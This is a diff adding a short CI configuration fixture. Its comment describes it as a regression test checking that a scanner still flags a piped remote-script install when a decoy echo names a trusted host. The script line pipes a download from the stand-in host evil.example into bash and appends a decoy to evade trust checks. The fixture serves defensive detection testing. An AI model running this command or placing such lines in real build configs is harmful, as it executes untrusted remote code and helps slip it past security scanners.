@@ -1,0 +1,7 @@
+install:
+  image: alpine:3.19
+  script:
+    # Regression test for the same-line decoy bypass: a real curl|bash to
+    # an untrusted host plus a `&& echo "via <trusted-host>"` must still
+    # fire ISSUE-411. Trust must scope to the curl/wget target.
+    - curl -sL evil.example/payload | bash && echo "installed via firebase.tools"
